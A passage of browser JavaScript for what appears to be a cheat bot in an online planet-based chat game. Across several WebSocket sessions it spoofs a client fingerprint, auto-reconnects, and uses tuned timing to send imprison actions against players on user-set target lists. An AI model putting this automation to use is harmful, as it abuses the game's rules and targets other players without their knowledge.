                  log1.scrollTop = log1.scrollHeight;
                } else {
                  log1.innerHTML += "Standing (auto-release enabled)<br>";
                  log1.scrollTop = log1.scrollHeight;
                }

                if (sleep.checked) {
              return OffSleep1();
            }
                if (work) {
                  setTimeout(() => {

                    ws1on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);
            }
          }
        }
      }

      if (snippets[0] === "PING\r\n") {
        ws1.send("PONG\r\n");
      }
	  if (snippets[0] === "471") {
		 setTimeout(() => {
        ws1.send("JOIN B\r\n");
		 }, 1000);
      }

      if (snippets[0] === "850" && snippets[1] != ":<div") {
        var text;
        for (var i = 40; i < snippets.length; i++) {
          text += snippets[i] + " ";
        }
        if (snippets[6] === "3s") {
          var logmsg = "3 second error."
          log1.innerHTML += logmsg.fontcolor("#ff0f0f") + "<br>";
          log1.scrollTop = log1.scrollHeight;
          // Increment timer on 3s error
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            incrementAttack();
            incrementDefence();
          }
        }
        else if (snippets[3] === "allows") {
          var logmsg = "Imprisoned successfully."
          log1.innerHTML += logmsg.fontcolor("#0fff7a") + "<br>";
          log1.scrollTop = log1.scrollHeight;
          // Decrement timer on success
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            decrementAttack();
            decrementDefence();
          }
        }
        else {
          log1.innerHTML += text + "<br>";
          log1.scrollTop = log1.scrollHeight;
        }
      }

      if (snippets[0] === "452" && snippets[3] === "sign") {
        log1.innerHTML += "You can enter galaxy only after 10s.<br>"
        log1.scrollTop = log1.scrollHeight;
        ws1on = false;
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector(
          "#btn-connect"
        );
        btn_element.dispatchEvent(click_event);
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var blacklist = document
          .getElementById("blacklist")
          .value.split("\n");
        blacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 1];
            targetids1.push(useridnew);
            targetnames1.push(element);
          }
        });
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var gangblacklist = document
          .getElementById("gangblacklist")
          .value.split("\n");
        gangblacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 2];
            targetids1.push(useridnew);

            targetnames1.push(member[memberindex + 1]);
          }
        });
      }

      if (snippets[0] === "PART" && targetids1.indexOf(snippets[1]) != -1) {
        var index = targetids1.indexOf(snippets[1]);

        targetids1.splice(index, 1);
        targetnames1.splice(index, 1);
        attackids1.splice(index, 1);
        attacknames1.splice(index, 1);
        if (smart.checked && snippets[1] === useridattack1 && targetids1.length != 0 && attackids1.length != 0) {
          var newArr = attackids1.slice();
          useridattack1 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids1.indexOf(useridattack1);
          log1.innerHTML += "New Target: " + attacknames1[ind] + "<br>";
          log1.scrollTop = log1.scrollHeight;
        }
        if (targetids1.length === 0 && (smart.checked)) {
          clearTimeout(timeout1);
          userFound1 = false;
          log1.innerHTML += "Standing now..<br>"
          log1.scrollTop = log1.scrollHeight;
        }
      }

      if (snippets[0] === "SLEEP" && targetids1.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, "")) != -1) {
        var index = targetids1.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, ""));
        targetids1.splice(index, 1);
        targetnames1.splice(index, 1);
        attackids1.splice(index, 1);
        attacknames1.splice(index, 1);

        if (smart.checked && (snippets[1] === useridattack1 + "\r\n") && targetids1.length != 0  && attackids1.length != 0) {
          var newArr = attackids1.slice();
          useridattack1 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids1.indexOf(useridattack1);
          log1.innerHTML += "New Target: " + attacknames1[ind] + "<br>";
          log1.scrollTop = log1.scrollHeight;
        }
        if (targetids1.length === 0 && (smart.checked)) {
          clearTimeout(timeout1);
          userFound1 = false;
          log1.innerHTML += "Standing now..<br>"
          log1.scrollTop = log1.scrollHeight;
        }
      }

      if (autoescape.checked) {
        if (snippets[0] === "900") {
          var plnt = snippets[1];
          console.log('DEBUG ws1: Got 900 message, planet=', plnt);
          if (plnt && plnt.slice(0, 6) === "Prison") {
            console.log('DEBUG ws1 autorelease: Prison detected, triggering escape');
            // Add a small delay before triggering escape to ensure proper state
            setTimeout(() => {
              var escape = document.getElementById("releasenow");
              if (escape) {
                escape.click();
                log1.innerHTML += "Auto-release triggered<br>";
                log1.scrollTop = log1.scrollHeight;
              } else {
                console.log('ERROR ws1: releasenow button not found');
              }
              var planet = document.getElementById("planet").value;
              setTimeout(() => {
                if (ws1 && ws1.readyState === 1) {
                  ws1.send(`JOIN ${planet}\r\n`);
                  console.log('DEBUG ws1 autorelease: rejoined planet after escape');
                } else {
                  console.log('DEBUG ws1 autorelease: ws1 not connected, cannot rejoin');
                }
              }, 3000);
            }, 1000);
          }
        } else if (snippets[1] === "PRISON" && snippets[2] === "0") {
          console.log('DEBUG ws1 autorelease: PRISON 0 detected, triggering escape');
          // Add a small delay before triggering escape to ensure proper state
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            if (escape) {
              escape.click();
              log1.innerHTML += "Auto-release triggered<br>";
              log1.scrollTop = log1.scrollHeight;
            } else {
              console.log('ERROR ws1: releasenow button not found');
            }
            var planet = document.getElementById("planet").value;
            setTimeout(() => {
              if (ws1 && ws1.readyState === 1) {
                ws1.send(`JOIN ${planet}\r\n`);
                console.log('DEBUG ws1 autorelease: rejoined planet after escape');
              } else {
                console.log('DEBUG ws1 autorelease: ws1 not connected, cannot rejoin');
              }
            }, 3000);
          }, 1000);
        }
      }

      if (snippets[0] === "900") {
        console.log('DEBUG ws1: 900 message received, planet:', snippets[1], 'auto-escape enabled:', autoescape.checked);
        log1.innerHTML += `Current Planet: ${snippets[1]}<br>`
        log1.scrollTop = log1.scrollHeight;

      }

    }
  }

  if (ws2) {
    ws2.onmessage = (event) => {
      var text = event.data;
      var snippets = text.split(" ");

      if (snippets[0] === "HAAAPSI") {
        haaapsi2 = snippets[1];
        // Clear pending timeout to prevent ghost actions
        clearTimeout(timeout2);
        userFound2 = false;
        status2 = "";
        threesec2 = false;
        targetids2 = [];
        targetnames2 = [];
        attackids2 = [];
        attacknames2 = [];
        useridattack2 = "";
        useridtarget2 = "";
        lowtime = 0;
        ws2.send("RECOVER " + rcc + "\r\n");
      }
      if (snippets[0] === "REGISTER") {
        var temp = parseHaaapsi(haaapsi2);
        id2 = snippets[1];
        var password = snippets[2];
        var username = snippets[3];
        useridg2 = id2;
        passwordg2 = password;
        finalusername2 = username.split("\r\n");
        ws2.send("USER " + id2 + " " + password + " " + finalusername2[0] + " " + temp + "\r\n");
      }
      if (snippets[0] === "999") {
        ws2.send("FWLISTVER 0\r\n");
        ws2.send("ADDONS 0 0\r\n");
        ws2.send("MYADDONS 0 0\r\n");
        ws2.send("PHONE 1366 768 0 2 :chrome 113.0.0.0\r\n");
        var planet = document.getElementById("planet").value;
        if (planet && planet !== "") {
          ws2.send("JOIN " + planet + "\r\n");
          log2.innerHTML = "Connection established. Joining " + planet + "<br>";
        } else {
          ws2.send("JOIN\r\n");
          log2.innerHTML = "Connection established.<br>";
        }
        log2.scrollTop = log2.scrollHeight;
        
        // Check prison status after connecting if auto-release is enabled
        if (autoescape.checked) {
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            if (escape) {
              escape.click();
            }
          }, 2000);
        }
      }

      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked != true)) {
        var data = (event.data.replaceAll("+", "")).toLowerCase();
        var blacklistfull = document.getElementById("blacklist").value.toLowerCase();
        var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
        var gangblacklistfull = document.getElementById("gangblacklist").value.toLowerCase();
        var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack2").value) + parseInt(document.getElementById("waiting2").value)) / 2) : (parseInt(document.getElementById("attack2").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (blacklistfull !== "") {
          blacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              if (arr[0] != undefined) {
                targetids2.push(arr[0].split(" ")[0]);
                attackids2.push(arr[0].split(" ")[0]);
                targetnames2.push(element);
                attacknames2.push(element);
              }
            }
          });
        }
        if (gangblacklistfull !== "") {
          gangblacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              for (var i = 0; i < arr.length; i++) {
                var value = arr[i];
                targetnames2.push(value.split(" ")[0]);
                attacknames2.push(value.split(" ")[0]);
                targetids2.push(value.split(" ")[1]);
                attackids2.push(value.split(" ")[1]);
              }
            }
          });
        }
        if (!userFound2 && targetids2.length != 0) {
          var rand = Math.floor(Math.random() * targetids2.length);
          var userid = targetids2[rand];
          userFound2 = true;
          useridattack2 = userid;
          useridtarget2 = userid;
          status2 = "attack";
          log2.innerHTML += timingLabel + " " + targetnames2[rand] + " in " + timing + "ms<br>";
          log2.scrollTop = log2.scrollHeight;



          timeout2 = setTimeout(() => {
            ws2.send("ACTION 3 " + useridattack2 + "\r\n");
            ws2.send("QUIT :ds\r\n");
            log2.innerHTML += "QUIT<br>";
            log2.scrollTop = log2.scrollHeight;

            if (sleep.checked) {
              return OffSleep2();
            }
            if (work) {
              setTimeout(() => {
                ws2on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      //lowsec
      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked === true)) {
        var members = event.data.split("+").join("");
        var midmembers = members.split("@").join("");
        var midmid = midmembers.split(":").join("");
        var finmembers = midmid.toLowerCase();
        var membersarr = finmembers.split(" ");
        membersarr.push("randomname");

        var whitelist = document.getElementById("blacklist").value.split("\n");
        var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
        var indexself = membersarr.indexOf(useridg2);
        membersarr[indexself] = "-";

        whitelist.forEach((element) => {
          if (membersarr.includes(element.toLowerCase())) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck + 1] = "-";
          }
        });

        gangwhitelist.forEach((element) => {
          var occurances = countOccurrences(membersarr, element.toLowerCase());
          for (var k = 0; k < occurances; k++) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck] = "-";
            membersarr[indexcheck + 2] = "-";
          }
        });

        var integers = membersarr.filter(Number);
        var userids = integers.filter(function (element) {
          if (isNaN(membersarr[membersarr.indexOf(element) - 1])) {
            return element.length >= 6;
          }
        });


        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack2").value) + parseInt(document.getElementById("waiting2").value)) / 2) : (parseInt(document.getElementById("attack2").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (!userFound2 && userids.length != 0) {
          var rand = Math.floor(Math.random() * userids.length);
          var userid = userids[rand];
          userFound2 = true;
          useridattack2 = userid;
          useridtarget2 = userid;
          status2 = "attack";
          log2.innerHTML += timingLabel + " " + membersarr[membersarr.indexOf(userid) - 1] + " in " + (timing) + "ms<br>";
          log2.scrollTop = log2.scrollHeight;


          timeout2 = setTimeout(() => {
            ws2.send("ACTION 3 " + useridattack2 + "\r\n");
            ws2.send("QUIT :ds\r\n");
            log2.innerHTML += "QUIT<br>";
            log2.scrollTop = log2.scrollHeight;

            if (sleep.checked) {
              return OffSleep2();
            }
            if (work) {
              setTimeout(() => {
                ws2on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound2) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack2").value) + parseInt(document.getElementById("waiting2").value)) / 2) : parseInt(document.getElementById("waiting2").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";

          for (let element of blacklist) {
            if (userFound2) break;
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 1];
              useridtarget2 = userid;
              status2 = "defense";
              log2.innerHTML += timingLabel + " " + element + " in " + (timing) + "ms<br>";
              log2.scrollTop = log2.scrollHeight;
              userFound2 = true;

              timeout2 = setTimeout(() => {

                ws2.send("ACTION 3 " + userid + "\r\n");
                ws2.send("QUIT :ds\r\n");
                log2.innerHTML += "QUIT<br>";
                log2.scrollTop = log2.scrollHeight;

                if (sleep.checked) {
              return OffSleep2();
            }

                if (work) {
                  setTimeout(() => {
                    ws2on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound2) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack2").value) + parseInt(document.getElementById("waiting2").value)) / 2) : parseInt(document.getElementById("waiting2").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          for (let element of gangblacklist) {
            if (userFound2) break;
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 2];
              useridtarget2 = userid;
              status2 = "defense";
              log2.innerHTML += timingLabel + " " + member[memberindex + 1] + " in " + (timing) + "ms<br>";
              log2.scrollTop = log2.scrollHeight;
              userFound2 = true;

              timeout2 = setTimeout(() => {

                ws2.send("ACTION 3 " + userid + "\r\n");
                ws2.send("QUIT :ds\r\n");
                log2.innerHTML += "QUIT<br>";
                log2.scrollTop = log2.scrollHeight;

                if (sleep.checked) {
              return OffSleep2();
            }


                if (work) {
                  setTimeout(() => {
                    ws2on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);

            }
          }
        }
      }

      //lowsec

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked === true)) {
        if (!userFound2) {
          var snip = event.data;
          var snipmid = snip.toLowerCase();
          var snipfinal = snipmid.split(" ");
          snipfinal.push("randomname");

          var whitelist = document.getElementById("blacklist").value.split("\n");
          var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack2").value) + parseInt(document.getElementById("waiting2").value)) / 2) : parseInt(document.getElementById("waiting2").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";
          var indexself = snipfinal.indexOf(useridg2);
          snipfinal[indexself] = "-";
          whitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 1] = "-"
            }
          });
          gangwhitelist.forEach((element) => {
            if (snipfinal.includes(element.toLowerCase())) {
              var indexcheck = snipfinal.indexOf(element.toLowerCase());
              snipfinal[indexcheck + 2] = "-"
            }
          });

          if (snipfinal.includes("randomname")) {
            if (snipfinal[3].length >= 6) {
              var userid = snipfinal[3];
              useridtarget2 = userid;
              status2 = "defense";
              log2.innerHTML += timingLabel + " in " + (timing) + "ms<br>";
              log2.scrollTop = log2.scrollHeight;
              userFound2 = true;
              timeout2 = setTimeout(() => {
                ws2.send("ACTION 3 " + userid + "\r\n");
                
                // Only send QUIT if auto-release is disabled, or if sleep mode is enabled
                if (!autoescape.checked || sleep.checked) {
                  ws2.send("QUIT :ds\r\n");
                  log2.innerHTML += "QUIT<br>";
                  log2.scrollTop = log2.scrollHeight;
                } else {
                  log2.innerHTML += "Standing (auto-release enabled)<br>";
                  log2.scrollTop = log2.scrollHeight;
                }

                if (sleep.checked) {
              return OffSleep2();
            }
                if (work) {
                  setTimeout(() => {
                    ws2on = false;
                    var click_event = new CustomEvent("click");
                    var btn_element = document.querySelector(
                      "#btn-connect"
                    );
                    btn_element.dispatchEvent(click_event);
                  }, parseInt(document.getElementById("reconnect").value));
                }
              }, timing);
            }
          }
        }
      }

      if (snippets[0] === "PING\r\n") {
        ws2.send("PONG\r\n");
      }
	  if (snippets[0] === "471") {
		 setTimeout(() => {
        ws2.send("JOIN B\r\n");
		 }, 1000);
      }

      if (snippets[0] === "850" && snippets[1] != ":<div") {
        var text;
        for (var i = 40; i < snippets.length; i++) {
          text += snippets[i] + " ";
        }
        if (snippets[6] === "3s") {
          var logmsg = "3 second error."
          log2.innerHTML += logmsg.fontcolor("#ff0f0f") + "<br>";
          log2.scrollTop = log2.scrollHeight;
          // Increment timer on 3s error
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            incrementAttack2();
            incrementDefence2();
          }
        }
        else if (snippets[3] === "allows") {
          var logmsg = "Imprisoned successfully."
          log2.innerHTML += logmsg.fontcolor("#0fff7a") + "<br>";
          log2.scrollTop = log2.scrollHeight;
          // Decrement timer on success
          if (timershift.checked) {
            // When auto interval is enabled, adjust both attack AND defense
            decrementAttack2();
            decrementDefence2();
          }
        }
        else {
          log2.innerHTML += text + "<br>";
          log2.scrollTop = log2.scrollHeight;
        }
      }

      if (snippets[0] === "452" && snippets[3] === "sign") {
        log2.innerHTML += "You can enter galaxy only after 10s.<br>"
        log2.scrollTop = log2.scrollHeight;
        ws2on = false;
        var click_event = new CustomEvent("click");
        var btn_element = document.querySelector(
          "#btn-connect"
        );
        btn_element.dispatchEvent(click_event);
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var blacklist = document
          .getElementById("blacklist")
          .value.split("\n");
        blacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 1];
            targetids2.push(useridnew);
            targetnames2.push(element);
          }
        });
      }

      if (snippets[0] === "JOIN") {
        var text = event.data.toLowerCase();
        var member = text.split(" ");
        var gangblacklist = document
          .getElementById("gangblacklist")
          .value.split("\n");
        gangblacklist.forEach(element => {
          if (member.includes(element.toLowerCase())) {
            var memberindex = member.indexOf(element.toLowerCase());
            var useridnew = member[memberindex + 2];
            targetids2.push(useridnew);

            targetnames2.push(member[memberindex + 1]);
          }
        });
      }


      if (snippets[0] === "PART" && targetids2.indexOf(snippets[1]) != -1) {
        var index = targetids2.indexOf(snippets[1]);

        targetids2.splice(index, 1);
        targetnames2.splice(index, 1);
        attackids2.splice(index, 1);
        attacknames2.splice(index, 1);
        if (smart.checked && snippets[1] === useridattack2 && targetids2.length != 0 && attackids2.length != 0) {
          var newArr = attackids2.slice();
          useridattack2 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids2.indexOf(useridattack2);
          log2.innerHTML += "New Target: " + attacknames2[ind] + "<br>";
          log2.scrollTop = log2.scrollHeight;
        }
        if (targetids2.length === 0 && (smart.checked)) {
          clearTimeout(timeout2);
          userFound2 = false;
          log2.innerHTML += "Standing now..<br>"
          log2.scrollTop = log2.scrollHeight;
        }
      }

      if (snippets[0] === "SLEEP" && targetids2.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, "")) != -1) {
        var index = targetids2.indexOf(snippets[1].replace(/(\r\n|\n|\r)/gm, ""));
        targetids2.splice(index, 1);
        targetnames2.splice(index, 1);
        attackids2.splice(index, 1);
        attacknames2.splice(index, 1);

        if (smart.checked && (snippets[1] === useridattack2 + "\r\n") && targetids2.length != 0 && attackids2.length != 0) {
          var newArr = attackids2.slice();
          useridattack2 = newArr[Math.floor(Math.random() * newArr.length)];
          var ind = attackids2.indexOf(useridattack2);
          log2.innerHTML += "New Target: " + attacknames2[ind] + "<br>";
          log2.scrollTop = log2.scrollHeight;
        }
        if (targetids2.length === 0 && (smart.checked)) {
          clearTimeout(timeout2);
          userFound2 = false;
          log2.innerHTML += "Standing now..<br>"
          log2.scrollTop = log2.scrollHeight;
        }
      }

      if (autoescape.checked) {
        if (snippets[0] === "900") {
          var plnt = snippets[1];
          console.log('DEBUG ws2: Got 900 message, planet=', plnt);
          if (plnt && plnt.slice(0, 6) === "Prison") {
            console.log('DEBUG ws2 autorelease: Prison detected, triggering escape');
            // Add a small delay before triggering escape to ensure proper state
            setTimeout(() => {
              var escape = document.getElementById("releasenow");
              if (escape) {
                escape.click();
                log2.innerHTML += "Auto-release triggered<br>";
                log2.scrollTop = log2.scrollHeight;
              } else {
                console.log('ERROR ws2: releasenow button not found');
              }
              var planet = document.getElementById("planet").value;
              setTimeout(() => {
                if (ws2 && ws2.readyState === 1) {
                  ws2.send(`JOIN ${planet}\r\n`);
                  console.log('DEBUG ws2 autorelease: rejoined planet after escape');
                } else {
                  console.log('DEBUG ws2 autorelease: ws2 not connected, cannot rejoin');
                }
              }, 3000);
            }, 1000);
          }
        } else if (snippets[1] === "PRISON" && snippets[2] === "0") {
          console.log('DEBUG ws2 autorelease: PRISON 0 detected, triggering escape');
          // Add a small delay before triggering escape to ensure proper state
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            if (escape) {
              escape.click();
              log2.innerHTML += "Auto-release triggered<br>";
              log2.scrollTop = log2.scrollHeight;
            } else {
              console.log('ERROR ws2: releasenow button not found');
            }
            var planet = document.getElementById("planet").value;
            setTimeout(() => {
              if (ws2 && ws2.readyState === 1) {
                ws2.send(`JOIN ${planet}\r\n`);
                console.log('DEBUG ws2 autorelease: rejoined planet after escape');
              } else {
                console.log('DEBUG ws2 autorelease: ws2 not connected, cannot rejoin');
              }
            }, 3000);
          }, 1000);
        }
      }

      if (snippets[0] === "900") {
        log2.innerHTML += `Current Planet: ${snippets[1]}<br>`
        log2.scrollTop = log2.scrollHeight;

      }

    }
  }

  if (ws3) {
    ws3.onmessage = (event) => {
      var text = event.data;
      var snippets = text.split(" ");

      if (snippets[0] === "HAAAPSI") {
        haaapsi3 = snippets[1];
        // Clear pending timeout to prevent ghost actions
        clearTimeout(timeout3);
        userFound3 = false;
        status3 = "";
        threesec3 = false;
        targetids3 = [];
        targetnames3 = [];
        attackids3 = [];
        attacknames3 = [];
        useridattack3 = "";
        useridtarget3 = "";
        lowtime = 0;
        ws3.send("RECOVER " + rccc + "\r\n");
      }
      if (snippets[0] === "REGISTER") {
        var temp = parseHaaapsi(haaapsi3);
        id3 = snippets[1];
        var password = snippets[2];
        var username = snippets[3];
        useridg3 = id3;
        passwordg3 = password;
        finalusername3 = username.split("\r\n");
        ws3.send("USER " + id3 + " " + password + " " + finalusername3[0] + " " + temp + "\r\n");
      }
      if (snippets[0] === "999") {
        ws3.send("FWLISTVER 0\r\n");
        ws3.send("ADDONS 0 0\r\n");
        ws3.send("MYADDONS 0 0\r\n");
        ws3.send("PHONE 1366 768 0 2 :chrome 113.0.0.0\r\n");
        var planet = document.getElementById("planet").value;
        if (planet && planet !== "") {
          ws3.send("JOIN " + planet + "\r\n");
          log3.innerHTML = "Connection established. Joining " + planet + "<br>";
        } else {
          ws3.send("JOIN\r\n");
          log3.innerHTML = "Connection established.<br>";
        }
        log3.scrollTop = log3.scrollHeight;
        
        // Check prison status after connecting if auto-release is enabled
        if (autoescape.checked) {
          setTimeout(() => {
            var escape = document.getElementById("releasenow");
            if (escape) {
              escape.click();
            }
          }, 2000);
        }
      }

      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked != true)) {
        var data = (event.data.replaceAll("+", "")).toLowerCase();
        var blacklistfull = document.getElementById("blacklist").value.toLowerCase();
        var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
        var gangblacklistfull = document.getElementById("gangblacklist").value.toLowerCase();
        var gangblacklist = document.getElementById("gangblacklist").value.toLowerCase().split("\n");
        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack3").value) + parseInt(document.getElementById("waiting3").value)) / 2) : (parseInt(document.getElementById("attack3").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (blacklistfull !== "") {
          blacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              if (arr[0] != undefined) {
                targetids3.push(arr[0].split(" ")[0]);
                attackids3.push(arr[0].split(" ")[0]);
                targetnames3.push(element);
                attacknames3.push(element);
              }
            }
          });
        }
        if (gangblacklistfull !== "") {
          gangblacklist.forEach((element) => {
            if (data.includes(element)) {

              var replace = element + " ";
              var replaced = data.replaceAll(replace, "*");
              var arr = replaced.split("*");
              arr.shift();
              for (var i = 0; i < arr.length; i++) {
                var value = arr[i];
                targetnames3.push(value.split(" ")[0]);
                attacknames3.push(value.split(" ")[0]);
                targetids3.push(value.split(" ")[1]);
                attackids3.push(value.split(" ")[1]);
              }
            }
          });
        }
        if (!userFound3 && targetids3.length != 0) {
          var rand = Math.floor(Math.random() * targetids3.length);
          var userid = targetids3[rand];
          userFound3 = true;
          useridattack3 = userid;
          useridtarget3 = userid;
          status3 = "attack";
          log3.innerHTML += timingLabel + " " + targetnames3[rand] + " in " + timing + "ms<br>";
          log3.scrollTop = log3.scrollHeight;



          timeout3 = setTimeout(() => {
            ws3.send("ACTION 3 " + useridattack3 + "\r\n");
            ws3.send("QUIT :ds\r\n");
            log3.innerHTML += "QUIT<br>";
            log3.scrollTop = log3.scrollHeight;

            if (sleep.checked) {
              return OffSleep3();
            }
            if (work) {
              setTimeout(() => {
                ws3on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      //lowsec
      if (snippets[0] === "353" && snippets[3].slice(0, 6) !== "Prison" && (document.getElementById("lowsecmode").checked === true)) {
        var members = event.data.split("+").join("");
        var midmembers = members.split("@").join("");
        var midmid = midmembers.split(":").join("");
        var finmembers = midmid.toLowerCase();
        var membersarr = finmembers.split(" ");
        membersarr.push("randomname");

        var whitelist = document.getElementById("blacklist").value.split("\n");
        var gangwhitelist = document.getElementById("gangblacklist").value.split("\n");
        var indexself = membersarr.indexOf(useridg3);
        membersarr[indexself] = "-";

        whitelist.forEach((element) => {
          if (membersarr.includes(element.toLowerCase())) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck + 1] = "-";
          }
        });

        gangwhitelist.forEach((element) => {
          var occurances = countOccurrences(membersarr, element.toLowerCase());
          for (var k = 0; k < occurances; k++) {
            var indexcheck = membersarr.indexOf(element.toLowerCase());
            membersarr[indexcheck] = "-";
            membersarr[indexcheck + 2] = "-";
          }
        });

        var integers = membersarr.filter(Number);
        var userids = integers.filter(function (element) {
          if (isNaN(membersarr[membersarr.indexOf(element) - 1])) {
            return element.length >= 6;
          }
        });


        var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack3").value) + parseInt(document.getElementById("waiting3").value)) / 2) : (parseInt(document.getElementById("attack3").value));
        var timingLabel = timershift.checked ? "Auto" : "Attack";
        if (!userFound3 && userids.length != 0) {
          var rand = Math.floor(Math.random() * userids.length);
          var userid = userids[rand];
          userFound3 = true;
          useridattack3 = userid;
          useridtarget3 = userid;
          status3 = "attack";
          log3.innerHTML += timingLabel + " " + membersarr[membersarr.indexOf(userid) - 1] + " in " + (timing) + "ms<br>";
          log3.scrollTop = log3.scrollHeight;


          timeout3 = setTimeout(() => {
            ws3.send("ACTION 3 " + useridattack3 + "\r\n");
            ws3.send("QUIT :ds\r\n");
            log3.innerHTML += "QUIT<br>";
            log3.scrollTop = log3.scrollHeight;

            if (sleep.checked) {
              return OffSleep3();
            }
            if (work) {
              setTimeout(() => {
                ws3on = false;
                var click_event = new CustomEvent("click");
                var btn_element = document.querySelector(
                  "#btn-connect"
                );
                btn_element.dispatchEvent(click_event);
              }, parseInt(document.getElementById("reconnect").value));
            }

          }, timing);
        }
      }

      if (snippets[0] === "JOIN" && (document.getElementById("lowsecmode").checked != true)) {
        if (!userFound3) {
          var text = event.data.toLowerCase();
          var member = text.split(" ");
          var blacklist = document.getElementById("blacklist").value.toLowerCase().split("\n");
          var timing = timershift.checked ? Math.round((parseInt(document.getElementById("attack3").value) + parseInt(document.getElementById("waiting3").value)) / 2) : parseInt(document.getElementById("waiting3").value);
          var timingLabel = timershift.checked ? "Auto" : "Defense";

          for (let element of blacklist) {
            if (userFound3) break;
            if (member.includes(element.toLowerCase())) {
              var memberindex = member.indexOf(element.toLowerCase());
              var userid = member[memberindex + 1];
              useridtarget3 = userid;
              status3 = "defense";
              log3.innerHTML += timingLabel + " " + element + " in " + (timing) + "ms<br>";
              log3.scrollTop = log3.scrollHeight;
              userFound3 = true;

              timeout3 = setTimeout(() => {

                ws3.send("ACTION 3 " + userid + "\r\n");
